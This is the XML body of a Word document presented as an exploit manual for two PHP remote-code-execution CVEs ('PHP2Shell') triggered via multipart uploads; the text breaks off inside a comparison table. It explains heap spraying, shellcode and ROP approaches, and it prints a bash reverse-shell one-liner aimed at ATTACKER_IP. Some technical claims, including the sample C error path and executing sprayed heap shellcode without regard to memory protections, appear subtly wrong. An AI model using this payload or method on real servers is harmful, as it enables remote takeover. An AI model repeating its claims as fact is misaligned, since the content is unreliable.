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72"/>
        </w:rPr>
        <w:t>PHP2Shell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="36"/>
        </w:rPr>
        <w:t>CVE-2026-109618 &amp; CVE-2026-109619</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Detailed Exploit Manual &amp; Lab Reproduction</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Generated 2026-10-27</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>1. Executive Summary</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>CVE-2026-109618 and CVE-2026-109619 (collectively "PHP2Shell") are two critical remote-code-execution vulnerabilities in the PHP engine itself, both rated CVSS 4.0 9.2. They share a common root cause: PHP's fatal-error and out-of-memory (OOM) unwinding path uses longjmp(), which bypasses all C-level cleanup. The result is that memory the engine still references is either left uninitialized (109618) or left pointing at freed regions (109619). An attacker who can (a) fill the PHP allocator with a known payload and (b) trigger the longjmp path achieves reliable RCE.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>The trigger vector is multipart HTTP uploads: a body large enough to exceed memory_limit fires the OOM path (109618); a malformed body that causes a parse/fatal error fires the error path (109619). Over 22.6 million exposed PHP instances were identified by Palo Alto Networks Cortex Xpanse at time of publication.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>2. Technical Background</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.1 PHP request lifecycle</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Each HTTP request handled by a PHP worker (mod_php child, php-fpm process, or php-cgi invocation) goes through:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Web server (Apache / nginx) receives the HTTP request and hands the body to PHP.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>PHP reads and parses the body. For multipart/form-data, the internal multipart parser allocates per-part buffers (field names, filenames, content).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>PHP builds the "request memory": zvals, strings, and arrays backing $_GET, $_POST, $_FILES, $_SERVER.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The PHP VM executes the target script's opcodes.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>PHP writes the HTTP response.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>PHP frees request memory; the worker is ready for the next request.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.2 Two memory domains</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2880"/>
        <w:gridCol w:w="2880"/>
        <w:gridCol w:w="2880"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:fill="D6E4F0"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Domain</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:fill="D6E4F0"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Lifetime</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:fill="D6E4F0"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Examples</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Request memory</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>One request</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Parsed multipart parts, $_POST strings, opcode execution context, EG(current_execute)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Global / engine memory</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Persists across requests (in a persistent worker)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Engine globals (EG()), compiled op-array cache, extension global state, TSRM data</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.3 longjmp() and PHP's error path</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>longjmp() is a C library function that transfers control to a previously saved stack frame (set by setjmp()). It does NOT unwind the stack normally: no destructors, no finally blocks, no cleanup code runs. PHP uses this pattern for fatal errors and OOM because a fatal condition can occur at any depth in the call stack, and PHP must abort the entire request and return to the top-level handler.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>// Simplified PHP fatal-error path</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>void php_request_startup(void) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    jmp_buf abort_jmp;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    if (setjmp(abort_jmp) == 0) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        parse_request_body();   // multipart parser lives here</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">        execute_opcodes();</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    // Reached only via longjmp(abort_jmp, 1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    // → send 500 / abort</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>void php_fatal_error(int code, const char *msg) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    /* log */</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t xml:space="preserve">    longjmp(EG(abort_jmp), 1);  // bypasses ALL cleanup</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Because longjmp() skips cleanup, any memory that was allocated during the aborted portion of the request is either left dangling (freed but still referenced) or left uninitialized (allocated but never properly set up). This is the root cause of both CVEs.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.4 Why multipart uploads are the trigger</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>The multipart parser allocates a buffer per part. Many parts or one huge part → large allocation → OOM when memory_limit is exceeded → 109618.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A malformed part (truncated boundary, invalid header, bad encoding) can escalate to a fatal parse error → longjmp → 109619.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>PHP's session.upload_progress feature (enabled by default) creates a progress file in upload_tmp_dir during multipart uploads, which is why the NGFW threat signature references 'upload.progress'.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.5 Heap spraying</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>After the longjmp, the corrupted memory contains whatever bytes were last written there. To control those bytes, the attacker fills the PHP allocator with a known payload before triggering the bug. This is called heap spraying.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>Before spray:  [free] [free] [free] [free]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>After spray:   [PAYLOAD] [PAYLOAD] [PAYLOAD] [PAYLOAD]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>After longjmp: PHP reads a stale pointer → lands on [PAYLOAD]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Spraying is done by sending many small multipart parts (each ~200 KB), each containing a copy of the shellcode or ROP chain. The allocator reuses freed blocks in LIFO/FIFO order, so the freed/uninitialized region PHP later reads is very likely one of the sprayed blocks.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.6 ROP chains and shellcode</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Option A — Direct shellcode (lab-friendly)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Spray position-independent shellcode (e.g., a bash reverse shell) into the heap. The corrupted pointer is a code pointer (function pointer, vtable entry, or return address). When PHP 'calls' it, the shellcode runs. No ASLR problem because the shellcode uses only relative references and syscalls.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Option B — ROP chain (real-world)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Spray a ROP chain: a sequence of 8-byte addresses, each pointing to a "gadget" in libc/libphp (a short instruction sequence ending in ret). The chain calls system("bash -i &gt;&amp; /dev/tcp/..."). You need the libc base address, which you obtain by reading the corrupted memory (both CVEs provide a read primitive).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2.7 The reverse shell payload</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:shd w:fill="F5F5F5"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/PORT 0&gt;&amp;1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>bash -i → interactive shell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>&gt;&amp; /dev/tcp/IP/PORT → redirect stdout (fd 1) to a TCP connection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>0&gt;&amp;1 → redirect stdin (fd 0) to the same connection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Result: bidirectional interactive shell over TCP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>3. Vulnerability Details</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 CVE-2026-109618 — OOM → Uninitialized Request Memory</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4320"/>
        <w:gridCol w:w="4320"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:shd w:fill="D6E4F0"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Field</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:shd w:fill="D6E4F0"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Value</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>CVSS 4.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>9.2 (Critical)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>CWE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>CWE-908 (Use of Uninitialized Resource)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Trigger</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Multipart body exceeding memory_limit → OOM</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Corrupted state</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Request memory left uninitialized after longjmp()</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Exploitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Read/execute leftover bytes in request memory</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Reliability</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>High — OOM is deterministic given size &gt; limit</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>When PHP's OOM handler fires during multipart parsing, it calls longjmp() to abort the request. The request memory (parsed parts, $_POST/$_FILES zvals) is NOT freed or zeroed. It retains the last bytes written. If the attacker pre-sprayed those bytes with shellcode or a ROP chain, the next memory access executes the payload.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.2 CVE-2026-109619 — Fatal Error → UAF Global Memory</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4320"/>
        <w:gridCol w:w="4320"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:shd w:fill="D6E4F0"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Field</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:shd w:fill="D6E4F0"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Value</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>CVSS 4.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>9.2 (Critical)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>CWE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>CWE-416 (Use After Free)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Trigger</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Malformed input → E_PARSE / E_ERROR fatal → longjmp()</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Corrupted state</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Global pointers left pointing at freed memory</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Exploitation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Next request dereferences stale pointer → UAF</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Reliability</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Moderate — depends on allocator reuse pattern</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>A fatal error (parse error, type error, etc.) triggers longjmp(). Global pointers (EG(current_execute), extension globals, op-array cache) are left pointing at memory that has been freed to the allocator. On the next request, PHP reads or branches on those stale pointers. If the freed block was overwritten by a heap spray, control flow is redirected to the attacker's code.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.3 How they complement each other</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2880"/>
        <w:gridCol w:w="2880"/>
        <w:gridCol w:w="2880"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:fill="D6E4F0"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:fill="D6E4F0"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>CVE-2026-109618</w:t>
            </w:r>
          </w:p>
